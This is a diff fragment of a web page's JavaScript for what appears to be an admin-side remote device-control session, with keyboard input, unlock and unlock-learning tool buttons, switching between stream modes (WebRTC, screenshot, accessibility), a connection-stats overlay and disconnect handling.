+function hideKb() { document.getElementById('kb-modal').classList.remove('show'); document.getElementById('kb-input').value = ''; }
+document.getElementById('tb-type').addEventListener('click', showKb);
+document.getElementById('kb-cancel').addEventListener('click', hideKb);
+document.getElementById('kb-send').addEventListener('click', () => {
+  const v = document.getElementById('kb-input').value;
+  if (v) sendMsg({ type:'keyboard', text: v });
+  hideKb();
+});
+document.getElementById('kb-input').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('kb-send').click(); });
+
+// Tools modal
+function showTools() { document.getElementById('tools-modal').classList.add('show'); }
+function hideTools() { document.getElementById('tools-modal').classList.remove('show'); }
+document.getElementById('tb-tools').addEventListener('click', showTools);
+document.getElementById('tools-close').addEventListener('click', hideTools);
+document.getElementById('tool-unlock').addEventListener('click', () => { sendMsg({ type:'unlock' }); document.getElementById('tools-result').textContent = 'Unlock sent…'; });
+document.getElementById('tool-verify').addEventListener('click', () => { sendMsg({ type:'verify' }); document.getElementById('tools-result').textContent = 'Verify sent…'; });
+document.getElementById('tool-learn').addEventListener('click', () => { sendMsg({ type:'learn_unlock' }); document.getElementById('tools-result').textContent = 'Learning started…'; });
+document.getElementById('tool-stoplearn').addEventListener('click', () => { sendMsg({ type:'stop_learn' }); document.getElementById('tools-result').textContent = 'Stopping…'; });
+
+// Mode cycle
+document.getElementById('hd-mode').addEventListener('click', () => {
+  if (!isConnected) return;
+  const order = ['webrtc','screenshot','accessibility'];
+  const i = order.indexOf(chosenMode);
+  const next = order[(i + 1) % order.length];
+  if (!confirm(`Switch to ${next.toUpperCase()} mode?\n\nThis will restart the stream.`)) return;
+  chosenMode = next;
+  // Reconnect with new mode
+  if (ws) ws.close();
+  isConnected = false;
+  document.getElementById('conn').classList.remove('hidden');
+  document.getElementById('conn-status').textContent = 'Switching to ' + next + '…';
+  setTimeout(connect, 500);
+});
+
+// Stats
+document.getElementById('hd-stats').addEventListener('click', () => {
+  statsOn = !statsOn;
+  document.getElementById('hd-stats').classList.toggle('active', statsOn);
+  document.getElementById('stats').classList.toggle('show', statsOn);
+  if (statsOn) startStats(); else stopStats();
+});
+
+function startStats() {
+  if (statsTimer) return;
+  statsTimer = setInterval(async () => {
+    sendMsg({ type:'ping', t: Date.now() });
+    const now = performance.now();
+    let text = `mode:    ${currentMode}\n`;
+    if (currentMode === 'screenshot') {
+      const cur = { t: now, bytes: ss.bytes, drawn: ss.drawn, recv: ss.recv };
+      if (ssPrev) {
+        const dt = (now - ssPrev.t) / 1000;
+        const fps = dt > 0 ? (cur.drawn - ssPrev.drawn) / dt : 0;
+        const recvFps = dt > 0 ? (cur.recv - ssPrev.recv) / dt : 0;
+        const kbps = dt > 0 ? Math.round((cur.bytes - ssPrev.bytes) * 8 / dt / 1000) : 0;
+        text += `video:   ${hostWidth}x${hostHeight} @${fps.toFixed(0)} fps (recv ${recvFps.toFixed(0)})\n`;
+        text += `bitrate: ${kbps} kbps\n`;
+      } else {
+        text += `waiting for frames…\n`;
+      }
+      ssPrev = cur;
+    } else if (pc) {
+      try {
+        const stats = await pc.getStats();
+        let inbound;
+        stats.forEach(s => { if (s.type === 'inbound-rtp' && s.kind === 'video') inbound = s; });
+        if (inbound) {
+          let kbps = 0;
+          if (lastTs) kbps = Math.round((inbound.bytesReceived - lastBytes) * 8 / (inbound.timestamp - lastTs));
+          lastBytes = inbound.bytesReceived; lastTs = inbound.timestamp;
+          text += `ice:     ${pc.iceConnectionState}\n`;
+          text += `video:   ${inbound.frameWidth}x${inbound.frameHeight} @${inbound.framesPerSecond} fps\n`;
+          text += `bitrate: ${kbps} kbps\n`;
+        }
+      } catch(_) {}
+    }
+    text += `ctrl:    ${ctrlRtt == null ? '?' : ctrlRtt} ms`;
+    document.getElementById('stats').textContent = text;
+  }, 1000);
+}
+function stopStats() {
+  if (statsTimer) { clearInterval(statsTimer); statsTimer = null; }
+  lastBytes = 0; lastTs = 0; ssPrev = null;
+}
+
+// Disconnect
+function disconnect(reason) {
+  if (statsTimer) { clearInterval(statsTimer); statsTimer = null; }
+  try { pc?.close(); } catch(_) {}
+  try { ws?.close(); } catch(_) {}
+  pc = null; ws = null;
+  isConnected = false;
+  document.getElementById('conn').classList.remove('hidden');
+  document.getElementById('conn-status').textContent = reason || 'Disconnected';
+  document.getElementById('conn-sub').textContent = 'You can close this tab';
+  document.getElementById('conn-cancel').textContent = 'Back to Admin';
+  document.getElementById('conn-cancel').onclick = () => window.close();
+  beep(440, 0.1); setTimeout(() => beep(330, 0.12), 90);
+}
+document.getElementById('hd-close').addEventListener('click', () => disconnect('Session ended'));
+document.getElementById('conn-cancel').addEventListener('click', () => {
+  if (isConnected) disconnect('Cancelled');
+  else window.close();
+});
+document.getElementById('hd-back').addEventListener('click', () => {
+  if (isConnected && !confirm('Close this remote session?')) return;
+  if (isConnected) disconnect('Closing');
+  setTimeout(() => window.close(), 200);
+});
+
+// ═══════════════════════════════════════════════════════════════════════
+//  BOOT
+// ═══════════════════════════════════════════════════════════════════════
+if (DEVICE_ID) {
+  document.getElementById('conn-cancel').textContent = 'Cancel';
+  setTimeout(connect, 300);
+}
+</script>
+</body>
+</html>
